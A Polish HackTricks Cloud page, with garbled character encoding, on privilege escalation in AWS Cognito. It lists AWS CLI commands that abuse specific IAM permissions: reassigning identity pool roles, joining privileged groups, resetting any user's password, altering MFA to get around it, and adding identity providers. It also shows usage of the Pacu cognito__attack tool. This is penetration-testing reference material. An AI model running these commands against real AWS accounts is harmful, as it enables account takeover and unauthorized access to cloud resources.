# AWS - Eskalacja uprawnieÅ„ w Cognito

<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Cognito

Aby uzyskaÄ‡ wiÄ™cej informacji na temat Cognito, sprawdÅº:

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### Zbieranie poÅ›wiadczeÅ„ z Identity Pool

PoniewaÅ¼ Cognito moÅ¼e przyznawaÄ‡ poÅ›wiadczenia **uprawnieÅ„ IAM** zarÃ³wno **uwierzytelnionym**, jak i **nieuwierzytelnionym** **uÅ¼ytkownikom**, jeÅ›li zlokalizujesz **Identity Pool ID** aplikacji (powinno byÄ‡ na staÅ‚e w niej zakodowane), moÅ¼esz uzyskaÄ‡ nowe poÅ›wiadczenia i tym samym eskalowaÄ‡ uprawnienia (w ramach konta AWS, w ktÃ³rym prawdopodobnie wczeÅ›niej nie miaÅ‚eÅ› Å¼adnych poÅ›wiadczeÅ„).

Aby uzyskaÄ‡ wiÄ™cej informacji, [**sprawdÅº tÄ™ stronÄ™**](../aws-unauthenticated-enum-access/#cognito).

**Potencjalne skutki:** BezpoÅ›rednia eskalacja uprawnieÅ„ do roli usÅ‚ug przypisanej do nieuwierzytelnionych uÅ¼ytkownikÃ³w (i prawdopodobnie do roli przypisanej do uwierzytelnionych uÅ¼ytkownikÃ³w).

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

Z tym uprawnieniem moÅ¼esz **przyznaÄ‡ dowolnÄ… rolÄ™ Cognito** uwierzytelnionym/nieuwierzytelnionym uÅ¼ytkownikom aplikacji Cognito.
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```
JeÅ›li aplikacja Cognito **nie ma wÅ‚Ä…czonej obsÅ‚ugi nieuwierzytelnionych uÅ¼ytkownikÃ³w**, moÅ¼e byÄ‡ konieczne rÃ³wnieÅ¼ posiadanie uprawnienia `cognito-identity:UpdateIdentityPool`, aby je wÅ‚Ä…czyÄ‡.

**Potencjalne skutki:** BezpoÅ›rednie podniesienie uprawnieÅ„ do dowolnej roli Cognito.

### `cognito-identity:update-identity-pool`

AtakujÄ…cy posiadajÄ…cy to uprawnienie mÃ³gÅ‚by na przykÅ‚ad ustawiÄ‡ pulÄ™ uÅ¼ytkownikÃ³w Cognito pod swojÄ… kontrolÄ… lub dowolny inny dostawca toÅ¼samoÅ›ci, gdzie moÅ¼e siÄ™ zalogowaÄ‡ jako **sposÃ³b dostÄ™pu do tej puli toÅ¼samoÅ›ci Cognito**. NastÄ™pnie, po prostu **zalogowanie siÄ™** na tym dostawcy uÅ¼ytkownikÃ³w pozwoli mu **uzyskaÄ‡ dostÄ™p do skonfigurowanej roli uwierzytelnionej w puli toÅ¼samoÅ›ci**.
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
MoÅ¼liwe jest rÃ³wnieÅ¼ **wykorzystanie tego uprawnienia do umoÅ¼liwienia uwierzytelniania podstawowego**:
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**Potencjalne skutki**: Naruszenie skonfigurowanej uwierzytelnionej roli IAM w puli toÅ¼samoÅ›ci.

### `cognito-idp:AdminAddUserToGroup`

To uprawnienie umoÅ¼liwia **dodanie uÅ¼ytkownika Cognito do grupy Cognito**, dlatego atakujÄ…cy moÅ¼e wykorzystaÄ‡ to uprawnienie, aby dodaÄ‡ uÅ¼ytkownika pod swojÄ… kontrolÄ… do innych grup z **lepszymi** uprawnieniami lub **rÃ³Å¼nymi rolami IAM**:
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**Potencjalne skutki:** Podniesienie uprawnieÅ„ do innych grup Cognito oraz rÃ³l IAM przypisanych do grup puli uÅ¼ytkownikÃ³w.

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

AtakujÄ…cy posiadajÄ…cy te uprawnienia mÃ³gÅ‚by **tworzyÄ‡/aktualizowaÄ‡ grupy** z **kaÅ¼dÄ… rolÄ… IAM, ktÃ³ra moÅ¼e byÄ‡ wykorzystana przez skompromitowanego dostawcÄ™ toÅ¼samoÅ›ci Cognito** oraz umieÅ›ciÄ‡ skompromitowanego uÅ¼ytkownika w grupie, uzyskujÄ…c dostÄ™p do wszystkich tych rÃ³l:

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**Potencjalne skutki:** Podniesienie uprawnieÅ„ do innych rÃ³l IAM Cognito.

### `cognito-idp:AdminConfirmSignUp`

To uprawnienie umoÅ¼liwia **potwierdzenie rejestracji**. DomyÅ›lnie kaÅ¼dy moÅ¼e zarejestrowaÄ‡ siÄ™ w aplikacjach Cognito, jeÅ›li zostanie to wÅ‚Ä…czone, uÅ¼ytkownik moÅ¼e utworzyÄ‡ konto z dowolnymi danymi i potwierdziÄ‡ je przy uÅ¼yciu tego uprawnienia.
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**Potencjalne skutki:** PoÅ›rednie podniesienie uprawnieÅ„ do roli IAM puli toÅ¼samoÅ›ci dla uwierzytelnionych uÅ¼ytkownikÃ³w, jeÅ›li moÅ¼na zarejestrowaÄ‡ nowego uÅ¼ytkownika. PoÅ›rednie podniesienie uprawnieÅ„ do innych funkcjonalnoÅ›ci aplikacji, umoÅ¼liwiajÄ…ce potwierdzenie dowolnego konta.

### `cognito-idp:AdminCreateUser`

To uprawnienie umoÅ¼liwia atakujÄ…cemu utworzenie nowego uÅ¼ytkownika w puli uÅ¼ytkownikÃ³w. Nowy uÅ¼ytkownik jest tworzony jako wÅ‚Ä…czony, ale bÄ™dzie musiaÅ‚ zmieniÄ‡ swoje hasÅ‚o.
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**Potencjalne skutki:** BezpoÅ›rednie podniesienie uprawnieÅ„ do roli IAM puli toÅ¼samoÅ›ci dla uwierzytelnionych uÅ¼ytkownikÃ³w. PoÅ›rednie podniesienie uprawnieÅ„ do innych funkcji aplikacji, umoÅ¼liwiajÄ…ce tworzenie dowolnego uÅ¼ytkownika.

### `cognito-idp:AdminEnableUser`

Te uprawnienia mogÄ… pomÃ³c w bardzo szczegÃ³lnym przypadku, gdy atakujÄ…cy znajdzie poÅ›wiadczenia wyÅ‚Ä…czonego uÅ¼ytkownika i musi go **ponownie wÅ‚Ä…czyÄ‡**.
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**Potencjalne skutki:** PoÅ›rednie podniesienie uprawnieÅ„ do roli IAM puli toÅ¼samoÅ›ci dla uwierzytelnionych uÅ¼ytkownikÃ³w oraz uprawnieÅ„ uÅ¼ytkownika, jeÅ›li atakujÄ…cy posiadaÅ‚ poÅ›wiadczenia dla wyÅ‚Ä…czonego uÅ¼ytkownika.

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

To uprawnienie umoÅ¼liwia logowanie za pomocÄ… [**metody ADMIN\_USER\_PASSWORD\_AUTH**](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password\_auth)**.** Aby uzyskaÄ‡ wiÄ™cej informacji, przejdÅº do linku.

### `cognito-idp:AdminSetUserPassword`

To uprawnienie umoÅ¼liwiÅ‚oby atakujÄ…cemu **zmianÄ™ hasÅ‚a dowolnego uÅ¼ytkownika**, umoÅ¼liwiajÄ…c mu podszywanie siÄ™ pod dowolnego uÅ¼ytkownika (ktÃ³ry nie ma wÅ‚Ä…czonej MFA).
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**Potencjalne skutki:** BezpoÅ›rednie podniesienie uprawnieÅ„ do potencjalnie dowolnego uÅ¼ytkownika, co umoÅ¼liwia dostÄ™p do wszystkich grup, do ktÃ³rych naleÅ¼y dany uÅ¼ytkownik, oraz dostÄ™p do roli IAM uwierzytelnionej w puli toÅ¼samoÅ›ci.

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**: AtakujÄ…cy moÅ¼e potencjalnie wykorzystaÄ‡ te uprawnienia, aby ustawiÄ‡ swÃ³j wÅ‚asny telefon komÃ³rkowy jako **SMS MFA dla uÅ¼ytkownika**.
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** Podobnie jak poprzednie uprawnienie, to uprawnienie moÅ¼na wykorzystaÄ‡ do ustawienia preferencji MFA uÅ¼ytkownika w celu obejÅ›cia ochrony MFA.
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: Podobnie jak poprzednie uprawnienie, to uprawnienie moÅ¼na uÅ¼yÄ‡ do ustawienia preferencji MFA dla puli uÅ¼ytkownikÃ³w w celu obejÅ›cia ochrony MFA.
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** MoÅ¼liwe jest rÃ³wnieÅ¼ zaktualizowanie puli uÅ¼ytkownikÃ³w w celu zmiany polityki MFA. [SprawdÅº tutaj cli](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html).

**Potencjalne skutki:** PoÅ›rednie podniesienie uprawnieÅ„, ktÃ³re moÅ¼e dotyczyÄ‡ dowolnego uÅ¼ytkownika, ktÃ³ry zna dane uwierzytelniajÄ…ce atakujÄ…cego. MoÅ¼e to umoÅ¼liwiÄ‡ obejÅ›cie ochrony MFA.

### `cognito-idp:AdminUpdateUserAttributes`

AtakujÄ…cy posiadajÄ…cy te uprawnienia moÅ¼e zmieniÄ‡ adres e-mail, numer telefonu lub inne atrybuty uÅ¼ytkownika znajdujÄ…cego siÄ™ pod jego kontrolÄ…, aby uzyskaÄ‡ wiÄ™ksze uprawnienia w aplikacji.\
To pozwala na zmianÄ™ adresu e-mail lub numeru telefonu i ustawienie go jako zweryfikowany.
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**Potencjalne skutki:** Potencjalne poÅ›rednie podniesienie uprawnieÅ„ w aplikacji wykorzystujÄ…cej Cognito User Pool, ktÃ³re przyznaje uprawnienia na podstawie atrybutÃ³w uÅ¼ytkownika.

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

AtakujÄ…cy posiadajÄ…cy te uprawnienia mÃ³gÅ‚by **utworzyÄ‡ nowego klienta User Pool o mniejszych ograniczeniach** niÅ¼ istniejÄ…cy juÅ¼ klienci puli. Na przykÅ‚ad, nowy klient mÃ³gÅ‚by umoÅ¼liwiaÄ‡ dowolny rodzaj uwierzytelniania, nie posiadaÄ‡ Å¼adnego sekretu, wyÅ‚Ä…czaÄ‡ uniewaÅ¼nianie tokenÃ³w, umoÅ¼liwiaÄ‡ waÅ¼noÅ›Ä‡ tokenÃ³w przez dÅ‚uÅ¼szy okres...

To samo moÅ¼na zrobiÄ‡, jeÅ›li **zmodyfikowany zostanie istniejÄ…cy klient** zamiast tworzenia nowego.

W [**wierszu poleceÅ„**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html) (lub [**aktualizacji**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)) moÅ¼na zobaczyÄ‡ wszystkie opcje, sprawdÅº to!.
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**Potencjalne skutki:** Potencjalne poÅ›rednie podniesienie uprawnieÅ„ do uÅ¼ytkownika uwierzytelnionego w puli toÅ¼samoÅ›ci, uÅ¼ywanego przez pulÄ™ uÅ¼ytkownikÃ³w, poprzez utworzenie nowego klienta, ktÃ³ry Å‚agodzi Å›rodki bezpieczeÅ„stwa i umoÅ¼liwia atakujÄ…cemu zalogowanie siÄ™ jako uÅ¼ytkownik, ktÃ³rego byÅ‚ w stanie utworzyÄ‡.

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

AtakujÄ…cy mÃ³gÅ‚by wykorzystaÄ‡ te uprawnienia do tworzenia uÅ¼ytkownikÃ³w poprzez przesyÅ‚anie pliku CSV z nowymi uÅ¼ytkownikami.
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
(W przypadku tworzenia nowego zadania importu moÅ¼e byÄ‡ rÃ³wnieÅ¼ wymagane uprawnienie iam passrole, nie testowaÅ‚em tego jeszcze).

**Potencjalne skutki:** BezpoÅ›rednie podniesienie uprawnieÅ„ do roli IAM puli toÅ¼samoÅ›ci dla uwierzytelnionych uÅ¼ytkownikÃ³w. PoÅ›rednie podniesienie uprawnieÅ„ do innych funkcji aplikacji, umoÅ¼liwiajÄ…ce tworzenie dowolnego uÅ¼ytkownika.

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

AtakujÄ…cy mÃ³gÅ‚by utworzyÄ‡ nowego dostawcÄ™ toÅ¼samoÅ›ci, aby nastÄ™pnie mÃ³c **zalogowaÄ‡ siÄ™ za pomocÄ… tego dostawcy**.
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**Potencjalne skutki:** BezpoÅ›rednie podniesienie uprawnieÅ„ do roli IAM puli toÅ¼samoÅ›ci dla uwierzytelnionych uÅ¼ytkownikÃ³w. PoÅ›rednie podniesienie uprawnieÅ„ do innych funkcji aplikacji, umoÅ¼liwiajÄ…ce tworzenie dowolnych uÅ¼ytkownikÃ³w.

### Analiza cognito-sync:\*

To jest bardzo czÄ™ste uprawnienie domyÅ›lnie przypisywane rolom puli toÅ¼samoÅ›ci Cognito. Nawet jeÅ›li uÅ¼ycie symbolu wieloznacznego w uprawnieniach zawsze wyglÄ…da podejrzanie (szczegÃ³lnie w przypadku AWS), **udzielone uprawnienia nie sÄ… zbyt przydatne z perspektywy atakujÄ…cego**.

To uprawnienie umoÅ¼liwia odczyt informacji o uÅ¼ytkownikach pul toÅ¼samoÅ›ci oraz identyfikatorach toÅ¼samoÅ›ci wewnÄ…trz pul toÅ¼samoÅ›ci (co nie jest poufnymi informacjami).\
Identyfikatory toÅ¼samoÅ›ci mogÄ… mieÄ‡ przypisane [**Zbiory danych**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API_Dataset.html), ktÃ³re sÄ… informacjami o sesjach (AWS definiuje to jako **zapisanÄ… grÄ™**). MoÅ¼liwe, Å¼e mogÄ… zawieraÄ‡ one pewne poufne informacje (ale prawdopodobieÅ„stwo jest doÅ›Ä‡ niskie). W [**stronie wyliczania**](../aws-services/aws-cognito-enum/) moÅ¼na znaleÅºÄ‡ informacje, jak uzyskaÄ‡ dostÄ™p do tych informacji.

AtakujÄ…cy moÅ¼e rÃ³wnieÅ¼ uÅ¼yÄ‡ tych uprawnieÅ„ do **zapisania siÄ™ do strumienia Cognito, ktÃ³ry publikuje zmiany** w tych zbiorach danych lub **wywoÅ‚ania funkcji lambda w przypadku zdarzeÅ„ Cognito**. Nie widziaÅ‚em, Å¼eby to byÅ‚o wykorzystywane, i nie oczekiwaÅ‚bym tutaj poufnych informacji, ale nie jest to niemoÅ¼liwe.

### Automatyczne narzÄ™dzia

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), framework eksploatacji AWS, teraz zawiera moduÅ‚y "cognito\_\_enum" i "cognito\_\_attack", ktÃ³re automatyzujÄ… wyliczanie wszystkich zasobÃ³w Cognito w koncie, wykrywanie sÅ‚abych konfiguracji, atrybutÃ³w uÅ¼ytkownikÃ³w uÅ¼ywanych do kontroli dostÄ™pu itp., a takÅ¼e automatyzujÄ… tworzenie uÅ¼ytkownikÃ³w (w tym obsÅ‚ugÄ™ MFA) i podnoszenie uprawnieÅ„ na podstawie modyfikowalnych niestandardowych atrybutÃ³w, uÅ¼ytecznych poÅ›wiadczeÅ„ puli toÅ¼samoÅ›ci, rÃ³l do przyjÄ™cia w tokenach identyfikacyjnych itp.

Opis funkcji moduÅ‚Ã³w znajduje siÄ™ w czÄ™Å›ci 2 [wpisu na blogu](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Instrukcje instalacji znajdujÄ… siÄ™ na gÅ‚Ã³wnej stronie [Pacu](https://github.com/RhinoSecurityLabs/pacu).

#### UÅ¼ycie

PrzykÅ‚adowe uÅ¼ycie cognito\_\_attack w celu prÃ³by tworzenia uÅ¼ytkownika i wszystkich wektorÃ³w podniesienia uprawnieÅ„ dla okreÅ›lonej puli toÅ¼samoÅ›ci i klienta puli uÅ¼ytkownikÃ³w:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
PrzykÅ‚ad uÅ¼ycia cognito\_\_enum do zebrania wszystkich pul uÅ¼ytkownikÃ³w, klientÃ³w pul uÅ¼ytkownikÃ³w, pul toÅ¼samoÅ›ci, uÅ¼ytkownikÃ³w itp. widocznych w bieÅ¼Ä…cym koncie AWS:

```plaintext
cognito__enum
```

Ten polecenie wyÅ›wietli wszystkie dostÄ™pne informacje o pulach uÅ¼ytkownikÃ³w, klientach pul uÅ¼ytkownikÃ³w, pulach toÅ¼samoÅ›ci, uÅ¼ytkownikach itp. w bieÅ¼Ä…cym koncie AWS.
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) to narzÄ™dzie wiersza poleceÅ„ napisane w jÄ™zyku Python, ktÃ³re implementuje rÃ³Å¼ne ataki na Cognito, w tym eskalacjÄ™ uprawnieÅ„.

#### Instalacja
```bash
$ pip install cognito-scanner
```
#### UÅ¼ycie
```bash
$ cognito-scanner --help
```
Aby uzyskaÄ‡ wiÄ™cej informacji, sprawdÅº [https://github.com/padok-team/cognito-scanner](https://github.com/padok-team/cognito-scanner)

<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
